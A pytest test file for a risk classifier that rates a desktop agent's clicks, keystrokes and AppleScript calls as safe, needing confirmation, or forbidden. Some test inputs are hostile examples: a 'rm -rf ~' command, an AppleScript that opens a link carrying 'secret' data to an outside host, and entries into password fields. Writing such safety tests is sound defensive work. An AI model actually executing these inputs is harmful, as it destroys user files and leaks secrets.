import pytest

from milo.services.risk import Risk, Verdict, classify, normalize_combo


@pytest.mark.parametrize("tool, args, target, risk, reason", [
    ("ax_press", {"element": "e1"}, {"title": "Send", "app": "Mail"}, Risk.ASK, "send"),
    ("click", {"x": 1, "y": 1}, {"title": "Delete…", "app": "Finder"}, Risk.ASK, "delete"),
    ("click", {"x": 1, "y": 1}, {"title": "Buy Now"}, Risk.MONEY, "buy now"),
    ("click", {"x": 1, "y": 1}, {"title": "Place your order"}, Risk.MONEY, "order"),
    ("ax_press", {"element": "e1"}, {"title": "Empty Trash"}, Risk.ASK, "empty trash"),
    ("ax_press", {"element": "e1"}, {"title": "Jetzt kaufen"}, Risk.MONEY, "jetzt kaufen"),
    ("ax_press", {"element": "e1"}, {"title": "Löschen"}, Risk.ASK, "löschen"),
    ("ax_press", {"element": "e1"}, {"title": "", "description": "Submit form"}, Risk.ASK, "submit"),
    ("ax_press", {"element": "e1"}, {"title": "Save"}, Risk.OK, ""),
    ("ax_press", {"element": "e1"}, {"title": "Sender"}, Risk.OK, ""),
    ("ax_press", {"element": "e1"}, {"title": "Sign in"}, Risk.OK, ""),
    ("click", {"x": 1, "y": 1}, {}, Risk.OK, ""),
    ("click", {"x": 1, "y": 1}, {"unresolved": True}, Risk.ASK, "click something I can't name"),
    ("click", {"x": 1, "y": 1}, {"unresolved": True, "app": "1Password", "bundle": "com.1password.1password"},
     Risk.NEVER, "a security setting"),
    ("type", {"text": "hunter2"}, {"secure": True}, Risk.NEVER, "a password field"),
    ("ax_set_value", {"element": "e1", "text": "x"}, {"secure": True}, Risk.NEVER, "a password field"),
    ("type", {"text": "Dear Anna"}, {"title": "Message"}, Risk.OK, ""),
    ("type", {"text": "please delete this paragraph"}, {}, Risk.OK, ""),
    ("click", {"x": 1, "y": 1}, {"app": "System Settings", "title": "Privacy & Security"}, Risk.NEVER,
     "a security setting"),
    ("click", {"x": 1, "y": 1}, {"app": "System Settings", "title": "Wallpaper"}, Risk.ASK, "change a system setting"),
    ("click", {"x": 1, "y": 1}, {"app": "system settings", "title": "Login Items"}, Risk.NEVER, "a security setting"),
    ("type", {"text": "rm -rf ~"}, {"app": "Terminal"}, Risk.ASK, "run a command"),
    ("key", {"combo": "return"}, {"app": "iTerm2"}, Risk.ASK, "run a command"),
    ("open_app", {"name": "Terminal"}, {}, Risk.ASK, "open a program that runs commands"),
    ("ax_press", {"element": "e1"}, {"app": "Keychain Access", "title": "Show"}, Risk.NEVER, "a security setting"),
    ("key", {"combo": "cmd+delete"}, {}, Risk.ASK, "delete"),
    ("key", {"combo": "Command+Shift+Backspace"}, {}, Risk.ASK, "empty the Trash"),
    ("key", {"combo": "cmd+return"}, {}, Risk.ASK, "send"),
    ("key", {"combo": "cmd+shift+d"}, {"app": "Mail"}, Risk.ASK, "send"),
    ("key", {"combo": "return"}, {"title": "Send"}, Risk.ASK, "send"),
    ("key", {"combo": "return"}, {"title": "Notes"}, Risk.OK, ""),
    ("key", {"combo": "cmd+s"}, {}, Risk.OK, ""),
    ("open_app", {"name": "/Applications/Utilities/Terminal.app"}, {}, Risk.ASK, "open a program that runs commands"),
    ("type", {"text": "ls"}, {"app": "Mein Terminal", "bundle": "com.apple.Terminal"}, Risk.ASK, "run a command"),
    ("run_applescript", {"script": 'tell application "Mail" to send theMessage'}, {}, Risk.ASK, "send"),
    ("run_applescript", {"script": 'tell application "Finder" to delete file "a.txt"'}, {}, Risk.ASK, "delete"),
    ("run_applescript", {"script": 'tell application "Finder" to empty trash'}, {}, Risk.ASK, "empty trash"),
    ("run_applescript", {"script": 'tell application "Numbers" to activate'}, {}, Risk.ASK, "run a script"),
    ("run_applescript", {"script": 'tell application "Numbers" to set value of cell "A1" of table 1 of sheet 1 '
                                   'of document 1 to 5'}, {}, Risk.ASK, "run a script"),
    # Even a script that looks like it only makes a new document asks: it could open a link with data in it.
    ("run_applescript", {"script": 'tell application "TextEdit"\nmake new document\nopen location "https://x.io/?'
                                   'd=secret"\nend tell'}, {}, Risk.ASK, "run a script"),
    ("write_document", {"app": "TextEdit", "text": "Dear Anna"}, {"new": True}, Risk.OK, ""),
    ("sheet_write", {"app": "Numbers", "rows": [[1]], "new_document": True}, {"new": True}, Risk.OK, ""),
    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Budget", "filled": 0}, Risk.OK, ""),
    ("sheet_write", {"app": "Numbers", "rows": [["delete"]]}, {"document": "Budget", "filled": 0}, Risk.OK, ""),
    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Budget", "filled": 3}, Risk.ASK, "replace cells"),
    ("sheet_write", {"app": "Numbers", "rows": [[1]]}, {"document": "Book1", "filled": 3, "made": True}, Risk.OK,
     ""),
    ("sheet_read", {"app": "Numbers"}, {}, Risk.OK, ""),
    ("ax_find", {"text": "Send"}, {}, Risk.OK, ""),
    ("run_applescript", {"script": 'tell application ("System " & "Events") to keystroke "x"'}, {}, Risk.ASK,
     "run other programs or type for you"),
    ("run_applescript", {"script": 'set x to "Ev"\ntell application ("System " & x) to beep'}, {}, Risk.ASK,
     "run a script"),
    ("run_applescript", {"script": 'tell application "Keychain Access" to activate'}, {}, Risk.NEVER, "passwords"),
    ("run_applescript", {"script": 'set value of text field "Password" to "x"'}, {}, Risk.NEVER, "passwords"),
    ("screenshot", {}, {}, Risk.OK, ""),
    ("open_app", {"name": "Mail"}, {}, Risk.OK, ""),
])
def test_classify(tool, args, target, risk, reason):
    verdict = classify(tool, args, target)
    assert (verdict.risk, verdict.reason) == (risk, reason)


def test_combos_normalize():
    assert normalize_combo("Shift+Cmd+S") == normalize_combo("cmd+shift+s") == "shift+cmd+s"
    assert normalize_combo("⌘+⌥+esc") == "option+cmd+escape"
    assert normalize_combo("Enter") == "return"


def test_app_names_ignore_paths_case_and_the_app_suffix():
    from milo.services.risk import app_names
    assert app_names("/Applications/Terminal.app/", "com.apple.Terminal", "", None) == {"terminal", "com.apple.terminal"}
